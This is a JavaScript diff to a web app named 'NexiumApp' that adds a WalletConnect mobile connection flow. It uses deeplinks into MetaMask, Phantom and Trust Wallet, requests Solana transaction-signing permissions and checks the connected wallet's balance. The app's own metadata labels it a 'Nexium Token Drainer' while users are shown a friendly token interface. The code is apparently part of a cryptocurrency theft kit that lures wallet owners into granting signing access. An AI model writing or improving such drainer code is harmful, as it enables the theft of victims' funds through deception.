@@ -127,7 +127,17 @@ class NexiumApp {
       const isMobileUserAgent = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
       if (isMobileUserAgent) {
-        // Mobile: Open deeplink and connect like desktop extension
+        // Mobile: Initialize WalletConnect and trigger connection via deeplink
+        this.provider = await UniversalProvider.init({
+          projectId: CONFIG.WALLET_CONNECT_PROJECT_ID,
+          metadata: {
+            name: 'NexiumApp',
+            description: 'Nexium Token Drainer',
+            url: 'https://nexium-bot.onrender.com',
+            icons: ['https://nexium-bot.onrender.com/icon.png'],
+          },
+        });
+
         const deeplinks = {
           MetaMask: 'https://metamask.app.link/dapp/nexium-bot.onrender.com',
           Phantom: 'https://phantom.app/ul/v1/connect?app_url=https://nexium-bot.onrender.com',
@@ -141,57 +151,30 @@ class NexiumApp {
         console.log(`Opening ${walletName} with deeplink: ${deeplink}`);
         window.location.href = deeplink;
 
-        // Poll for wallet connection after deeplink
-        const checkConnection = setInterval(async () => {
-          if (walletName === 'MetaMask' && window.ethereum?.isMetaMask) {
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            if (accounts.length > 0) {
-              this.publicKey = accounts[0];
-              this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
-              const walletBalance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
-              console.log(`${walletName} connected: ${this.publicKey}, Balance: ${walletBalance}`);
-              this.updateButtonState('connected', walletName, this.publicKey);
-              this.hideMetaMaskPrompt();
-              this.showFeedback(`Connected to ${walletName} and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
-              this.renderTokenInterface();
-              clearInterval(checkConnection);
-            }
-          } else if (walletName === 'Phantom' && window.solana?.isPhantom) {
-            const response = await window.solana.connect();
-            this.publicKey = response.publicKey.toString();
+        // Wait for wallet to connect via WalletConnect
+        const session = await this.provider.connect({
+          namespaces: {
+            solana: {
+              chains: ['solana:mainnet'],
+              methods: ['solana_signTransaction', 'solana_signAllTransactions'],
+              events: ['chainChanged', 'accountsChanged'],
+            },
+          },
+        });
+
+        this.provider.on('connect', async () => {
+          const accounts = session.namespaces.solana.accounts;
+          if (accounts.length > 0) {
+            this.publicKey = accounts[0];
             this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
             const walletBalance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
-            console.log(`${walletName} connected: ${this.publicKey}, Balance: ${walletBalance}`);
+            console.log(`${walletName} connected via WalletConnect: ${this.publicKey}, Balance: ${walletBalance}`);
             this.updateButtonState('connected', walletName, this.publicKey);
             this.hideMetaMaskPrompt();
             this.showFeedback(`Connected to ${walletName} and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
             this.renderTokenInterface();
-            clearInterval(checkConnection);
-          } else if (walletName === 'TrustWallet' && window.solana?.isTrust) {
-            await new Promise(resolve => {
-              const checkSolana = () => {
-                if (window.solana && window.solana.isTrust) {
-                  resolve();
-                } else {
-                  setTimeout(checkSolana, 500);
-                }
-              };
-              checkSolana();
-            });
-            const response = await window.solana.connect({ onlyIfTrusted: false });
-            if (response && response.publicKey) {
-              this.publicKey = response.publicKey.toString();
-              this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
-              const walletBalance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
-              console.log(`${walletName} connected: ${this.publicKey}, Balance: ${walletBalance}`);
-              this.updateButtonState('connected', walletName, this.publicKey);
-              this.hideMetaMaskPrompt();
-              this.showFeedback(`Connected to ${walletName} and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
-              this.renderTokenInterface();
-              clearInterval(checkConnection);
-            }
           }
-        }, 1000); // Check every second
+        });
       } else {
         // Desktop: Use extension-based flow
         const hasEthereum = !!window.ethereum;
